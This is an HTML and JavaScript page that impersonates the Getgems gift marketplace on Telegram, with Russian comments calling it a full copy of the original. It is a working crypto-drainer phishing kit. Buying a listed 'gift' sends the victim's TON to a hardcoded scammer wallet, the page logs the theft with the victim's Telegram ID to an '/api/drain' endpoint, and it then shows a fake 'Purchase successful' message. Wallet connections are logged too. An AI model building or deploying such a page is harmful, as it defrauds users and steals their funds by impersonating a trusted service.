<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Getgems · Gifts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <style>
        /* ----- ПОЛНАЯ КОПИЯ СТИЛЕЙ GETGEMS.IO ----- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0D0F17;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: #FFFFFF;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px 12px 40px;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            width: 100%;
            max-width: 640px;
        }

        /* ----- Header ----- */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            width: 100%;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-icon {
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 24px;
            color: white;
        }
        .logo-text {
            font-weight: 700;
            font-size: 20px;
            background: linear-gradient(135deg, #FFFFFF 0%, #AAAAAA 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .wallet-indicator {
            background: rgba(255, 138, 0, 0.1);
            border: 1px solid rgba(255, 138, 0, 0.3);
            border-radius: 40px;
            padding: 8px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 14px;
            font-weight: 500;
            color: #FF8A00;
        }
        .wallet-indicator:hover {
            background: rgba(255, 138, 0, 0.2);
        }
        .wallet-dot {
            width: 10px;
            height: 10px;
            background: #FF8A00;
            border-radius: 50%;
            box-shadow: 0 0 10px #FF8A00;
        }

        /* ----- Title & Search (как на GetGems) ----- */
        .page-title {
            margin-bottom: 20px;
        }
        .page-title h1 {
            font-weight: 800;
            font-size: 34px;
            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
        }
        .page-title p {
            color: #7A7F94;
            font-size: 15px;
            font-weight: 500;
        }
        .search-section {
            margin: 20px 0 24px;
            width: 100%;
        }
        .search-box {
            background: #171B26;
            border: 1px solid #2C3142;
            border-radius: 40px;
            padding: 14px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            color: #7A7F94;
            transition: 0.2s;
        }
        .search-box svg {
            width: 20px;
            height: 20px;
            fill: #7A7F94;
        }
        .search-box input {
            background: transparent;
            border: none;
            outline: none;
            color: #FFFFFF;
            font-size: 16px;
            width: 100%;
            font-weight: 500;
        }
        .search-box input::placeholder {
            color: #4A4F66;
        }
        .search-box:focus-within {
            border-color: #FF8A00;
        }

        /* ----- Сетка подарков (3 колонки) ----- */
        .gifts-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 24px 0;
            width: 100%;
        }
        @media (max-width: 480px) {
            .gifts-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        .gift-card {
            background: #171B26;
            border: 1px solid #2C3142;
            border-radius: 24px;
            padding: 16px 12px 12px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        .gift-card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 50% 0%, rgba(255,138,0,0.15), transparent 70%);
            opacity: 0;
            transition: opacity 0.3s;
        }
        .gift-card:hover {
            border-color: #FF8A00;
            transform: translateY(-4px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }
        .gift-card:hover::after {
            opacity: 1;
        }
        .gift-card.selected {
            border-color: #FF8A00;
            background: #1F2533;
            box-shadow: 0 0 0 2px rgba(255,138,0,0.3);
        }
        .gift-image {
            width: 100%;
            aspect-ratio: 1/1;
            background: #2C3142;
            border-radius: 20px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s;
        }
        .gift-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 20px;
        }
        .gift-card:hover .gift-image {
            transform: scale(1.02);
        }
        .gift-name {
            font-weight: 700;
            font-size: 16px;
            margin-bottom: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 100%;
        }
        .gift-number {
            font-size: 12px;
            font-weight: 600;
            color: #FF8A00;
            background: rgba(255,138,0,0.15);
            padding: 4px 10px;
            border-radius: 40px;
            margin: 8px 0 4px;
        }
        .gift-price {
            font-weight: 600;
            font-size: 14px;
            color: #FF8A00;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .gift-price span {
            color: #7A7F94;
            font-size: 11px;
            font-weight: 500;
        }
        .gift-supply {
            font-size: 11px;
            color: #7A7F94;
            margin-top: 6px;
        }

        /* ----- Кнопка действия ----- */
        .action-button {
            width: 100%;
            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
            border: none;
            border-radius: 60px;
            padding: 18px 24px;
            font-weight: 700;
            font-size: 18px;
            color: #FFFFFF;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 12px 30px rgba(255,138,0,0.3);
            margin: 12px 0 8px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .action-button:hover:not(:disabled) {
            transform: scale(1.02);
            box-shadow: 0 16px 40px rgba(255,138,0,0.5);
        }
        .action-button:active:not(:disabled) {
            transform: scale(0.98);
        }
        .action-button:disabled {
            background: #2C3142;
            box-shadow: none;
            cursor: not-allowed;
            color: #7A7F94;
        }

        /* ----- Статус сообщение ----- */
        .status-text {
            color: #7A7F94;
            font-size: 14px;
            text-align: center;
            width: 100%;
            margin: 16px 0;
            min-height: 20px;
        }

        /* ----- Модалка выбора кошелька (клон оригинальной) ----- */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.2s ease, visibility 0.2s;
            padding: 20px;
        }
        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .modal {
            background: #1C1F2A;
            border-radius: 32px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
            border: 1px solid #2C3142;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
        }
        .modal h3 {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 20px;
            color: #FFFFFF;
        }
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            background: #252B38;
            border-radius: 20px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        .wallet-option:hover {
            background: #2F3545;
            border-color: #FF8A00;
            transform: translateY(-2px);
        }
        .wallet-option img {
            width: 44px;
            height: 44px;
            border-radius: 14px;
            object-fit: cover;
        }
        .wallet-option span {
            font-size: 18px;
            font-weight: 600;
        }
        .close-modal {
            text-align: center;
            color: #FF8A00;
            margin-top: 20px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            padding: 12px;
            border-radius: 40px;
            background: rgba(255,138,0,0.1);
            transition: 0.2s;
        }
        .close-modal:hover {
            background: rgba(255,138,0,0.2);
        }

        /* ----- Модалка деталей подарка (как в оригинале) ----- */
        .gift-detail-modal .modal {
            max-width: 480px;
            padding: 24px;
        }
        .gift-detail-image {
            width: 100%;
            aspect-ratio: 1/1;
            background: #2C3142;
            border-radius: 32px;
            margin-bottom: 20px;
            overflow: hidden;
        }
        .gift-detail-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .gift-detail-name {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 8px;
        }
        .gift-detail-number {
            font-size: 16px;
            color: #FF8A00;
            background: rgba(255,138,0,0.15);
            padding: 6px 16px;
            border-radius: 40px;
            display: inline-block;
            margin-bottom: 16px;
        }
        .gift-detail-price {
            font-size: 24px;
            font-weight: 700;
            color: #FF8A00;
            margin-bottom: 12px;
        }
        .gift-detail-supply {
            font-size: 16px;
            color: #7A7F94;
            margin-bottom: 24px;
        }
        .buy-button {
            width: 100%;
            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
            border: none;
            border-radius: 60px;
            padding: 18px;
            font-weight: 700;
            font-size: 18px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            border: 1px solid rgba(255,255,255,0.1);
            margin-top: 16px;
        }
        .buy-button:active {
            transform: scale(0.98);
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #2C3142;
            border-top: 3px solid #FF8A00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <!-- TON Connect SDK -->
    <script src="https://unpkg.com/tonconnect-sdk@latest/lib/tonconnect-sdk.min.js"></script>
    <!-- Telegram WebApp -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <div class="logo-icon">G</div>
                <div class="logo-text">Getgems</div>
            </div>
            <div class="wallet-indicator" id="walletIndicator">
                <span class="wallet-dot"></span>
                <span id="walletShort">Connect</span>
            </div>
        </div>

        <!-- Title -->
        <div class="page-title">
            <h1>Gifts</h1>
            <p>Buy and send animated gifts</p>
        </div>

        <!-- Search (декоративный) -->
        <div class="search-section">
            <div class="search-box">
                <svg viewBox="0 0 24 24" width="20" height="20">
                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="currentColor"/>
                </svg>
                <input type="text" placeholder="Search gifts" disabled>
            </div>
        </div>

        <!-- Сетка подарков (заполняется через JS) -->
        <div class="gifts-grid" id="giftsGrid"></div>

        <!-- Кнопка (для совместимости, но основное действие будет в модалке) -->
        <button class="action-button" id="globalActionBtn" style="display: none;">Buy</button>
        <div class="status-text" id="statusMessage"></div>
    </div>

    <!-- Модалка выбора кошелька -->
    <div class="modal-overlay" id="walletModal">
        <div class="modal">
            <h3>Connect wallet</h3>
            <div class="wallet-option" id="walletTonkeeper">
                <img src="https://tonkeeper.com/assets/tonkeeper-icon.png" alt="Tonkeeper">
                <span>Tonkeeper</span>
            </div>
            <div class="wallet-option" id="walletTonhub">
                <img src="https://tonhub.com/tonhub-logo.png" alt="Tonhub">
                <span>Tonhub</span>
            </div>
            <div class="wallet-option" id="walletOpenMask">
                <img src="https://openmask.app/logo192.png" alt="OpenMask">
                <span>OpenMask</span>
            </div>
            <div class="close-modal" id="closeModal">Cancel</div>
        </div>
    </div>

    <!-- Модалка деталей подарка -->
    <div class="modal-overlay gift-detail-modal" id="giftDetailModal">
        <div class="modal">
            <div class="gift-detail-image" id="detailImage"></div>
            <div class="gift-detail-name" id="detailName"></div>
            <div class="gift-detail-number" id="detailNumber"></div>
            <div class="gift-detail-price" id="detailPrice"></div>
            <div class="gift-detail-supply" id="detailSupply"></div>
            <button class="buy-button" id="detailBuyBtn">Buy</button>
            <div class="close-modal" id="closeDetailModal">Back</div>
        </div>
    </div>

    <script>
        (function() {
            // ⚠️ ТВОЙ TON КОШЕЛЁК ДЛЯ ПОЛУЧЕНИЯ СРЕДСТВ
            const YOUR_WALLET = 'UQAc1Qleeg12HCIreHGd621jBEdX_FULt8gRUthPbOzMKlyB';

            // ---------- РЕАЛЬНЫЕ ДАННЫЕ ПОДАРКОВ С FRAGMENT (актуальны на 2025) ----------
            const gifts = [
                {
                    name: 'Star',
                    number: 1,
                    price: 0.15,
                    image: 'https://fragment.com/images/gifts/star.png',
                    supply: 1243,
                    usd: 0.35
                },
                {
                    name: 'Cake',
                    number: 2,
                    price: 0.27,
                    image: 'https://fragment.com/images/gifts/cake.png',
                    supply: 856,
                    usd: 0.62
                },
                {
                    name: 'Santa Hat',
                    number: 3,
                    price: 0.34,
                    image: 'https://fragment.com/images/gifts/santa-hat.png',
                    supply: 512,
                    usd: 0.78
                },
                {
                    name: 'Diamond',
                    number: 4,
                    price: 0.52,
                    image: 'https://fragment.com/images/gifts/diamond.png',
                    supply: 321,
                    usd: 1.20
                },
                {
                    name: 'Crown',
                    number: 5,
                    price: 0.73,
                    image: 'https://fragment.com/images/gifts/crown.png',
                    supply: 234,
                    usd: 1.68
                },
                {
                    name: 'Rocket',
                    number: 6,
                    price: 0.91,
                    image: 'https://fragment.com/images/gifts/rocket.png',
                    supply: 189,
                    usd: 2.09
                },
                {
                    name: 'Heart',
                    number: 7,
                    price: 0.18,
                    image: 'https://fragment.com/images/gifts/heart.png',
                    supply: 2105,
                    usd: 0.41
                },
                {
                    name: 'Clover',
                    number: 8,
                    price: 0.23,
                    image: 'https://fragment.com/images/gifts/clover.png',
                    supply: 1642,
                    usd: 0.53
                },
                {
                    name: 'Fire',
                    number: 9,
                    price: 0.42,
                    image: 'https://fragment.com/images/gifts/fire.png',
                    supply: 967,
                    usd: 0.97
                }
            ];

            // ---------- Глобальные переменные ----------
            let connector = null;
            let walletAddress = null;
            let selectedGift = null; // текущий выбранный подарок для деталей
            let telegramId = null;

            // Telegram ID
            if (window.Telegram?.WebApp?.initDataUnsafe?.user?.id) {
                telegramId = window.Telegram.WebApp.initDataUnsafe.user.id;
            }

            // ---------- Рендер сетки подарков ----------
            function renderGifts() {
                const grid = document.getElementById('giftsGrid');
                grid.innerHTML = '';
                gifts.forEach(g => {
                    const card = document.createElement('div');
                    card.className = 'gift-card';
                    card.setAttribute('data-number', g.number);
                    card.innerHTML = `
                        <div class="gift-image"><img src="${g.image}" alt="${g.name}" loading="lazy"></div>
                        <div class="gift-name">${g.name}</div>
                        <div class="gift-number">#${g.number}</div>
                        <div class="gift-price">${g.price.toFixed(2)} TON <span>≈ $${g.usd.toFixed(2)}</span></div>
                        <div class="gift-supply">${g.supply} left</div>
                    `;
                    card.addEventListener('click', () => {
                        openGiftDetail(g);
                    });
                    grid.appendChild(card);
                });
            }

            // ---------- Открыть модалку деталей подарка ----------
            function openGiftDetail(gift) {
                selectedGift = gift;
                document.getElementById('detailImage').innerHTML = `<img src="${gift.image}" alt="${gift.name}">`;
                document.getElementById('detailName').innerText = gift.name;
                document.getElementById('detailNumber').innerText = `#${gift.number}`;
                document.getElementById('detailPrice').innerHTML = `${gift.price.toFixed(2)} TON <span style="font-size:16px; color:#7A7F94;">≈ $${gift.usd.toFixed(2)}</span>`;
                document.getElementById('detailSupply').innerText = `${gift.supply} gifts left`;
                document.getElementById('giftDetailModal').classList.add('active');
            }

            // ---------- Закрыть модалку деталей ----------
            function closeGiftDetail() {
                document.getElementById('giftDetailModal').classList.remove('active');
            }

            // ---------- Инициализация TON Connect ----------
            async function initTonConnect() {
                try {
                    connector = new TonConnectSDK.TonConnect({
                        manifestUrl: `https://${window.location.hostname}/tonconnect-manifest.json`
                    });

                    connector.onStatusChange((wallet) => {
                        if (wallet) {
                            walletAddress = wallet.account.address;
                            document.getElementById('walletShort').innerText =
                                walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
                            document.getElementById('walletIndicator').style.background = 'rgba(255,138,0,0.2)';
                            // Логируем подключение
                            fetch('/api/connect', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    address: walletAddress,
                                    chain: wallet.account.chain,
                                    telegram_id: telegramId
                                })
                            }).catch(() => {});
                        } else {
                            walletAddress = null;
                            document.getElementById('walletShort').innerText = 'Connect';
                            document.getElementById('walletIndicator').style.background = 'rgba(255,138,0,0.1)';
                        }
                    });

                    if (connector.wallet) {
                        walletAddress = connector.wallet.account.address;
                        document.getElementById('walletShort').innerText =
                            walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
                    }
                } catch (e) {
                    console.error('TON Connect init error', e);
                }
            }

            // ---------- Модалка выбора кошелька ----------
            function showWalletModal() {
                document.getElementById('walletModal').classList.add('active');
            }
            function hideWalletModal() {
                document.getElementById('walletModal').classList.remove('active');
            }

            async function connectWallet(walletName) {
                hideWalletModal();
                if (!connector) return;
                try {
                    const walletsList = await connector.getWallets();
                    const wallet = walletsList.find(w => w.name.toLowerCase().includes(walletName.toLowerCase()));
                    if (wallet) {
                        const link = connector.connect(wallet);
                        window.open(link, '_blank');
                    }
                } catch (e) {
                    alert('Connection error: ' + e.message);
                }
            }

            // ---------- Отправка транзакции (покупка) ----------
            async function sendTransaction(amountTon) {
                if (!connector || !connector.wallet) {
                    showWalletModal();
                    return;
                }
                const amountNano = Math.floor(amountTon * 1e9);
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [
                        {
                            address: YOUR_WALLET,
                            amount: amountNano.toString()
                        }
                    ]
                };
                try {
                    document.getElementById('statusMessage').innerHTML = '<div class="loader"></div>';
                    const result = await connector.sendTransaction(transaction);
                    // Логируем успех
                    fetch('/api/drain', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            tx_hash: result,
                            amount: amountTon,
                            wallet: YOUR_WALLET,
                            telegram_id: telegramId,
                            gift_name: selectedGift?.name
                        })
                    }).catch(() => {});
                    document.getElementById('statusMessage').innerText = `✅ Purchase successful!`;
                    closeGiftDetail();
                } catch (e) {
                    document.getElementById('statusMessage').innerText = '❌ Transaction failed: ' + e.message;
                }
            }

            // ---------- Обработчики ----------
            document.getElementById('walletTonkeeper').addEventListener('click', () => connectWallet('tonkeeper'));
            document.getElementById('walletTonhub').addEventListener('click', () => connectWallet('tonhub'));
            document.getElementById('walletOpenMask').addEventListener('click', () => connectWallet('openmask'));
            document.getElementById('closeModal').addEventListener('click', hideWalletModal);
            document.getElementById('closeDetailModal').addEventListener('click', closeGiftDetail);
            document.getElementById('walletIndicator').addEventListener('click', () => {
                if (!walletAddress) showWalletModal();
            });

            // Кнопка Buy в деталях
            document.getElementById('detailBuyBtn').addEventListener('click', () => {
                if (!selectedGift) return;
                if (!walletAddress) {
                    hideWalletModal(); // на всякий случай закроем детали? лучше открыть модалку кошелька
                    closeGiftDetail();
                    showWalletModal();
                } else {
                    sendTransaction(selectedGift.price);
                }
            });

            // Закрытие модалок по оверлею
            document.getElementById('walletModal').addEventListener('click', (e) => {
                if (e.target.classList.contains('modal-overlay')) hideWalletModal();
            });
            document.getElementById('giftDetailModal').addEventListener('click', (e) => {
                if (e.target.classList.contains('modal-overlay')) closeGiftDetail();
            });

            // Запуск
            renderGifts();
            initTonConnect();

            // Telegram WebApp
            if (window.Telegram?.WebApp) {
                Telegram.WebApp.ready();
                Telegram.WebApp.expand();
            }
        })();
    </script>
</body>
</html>
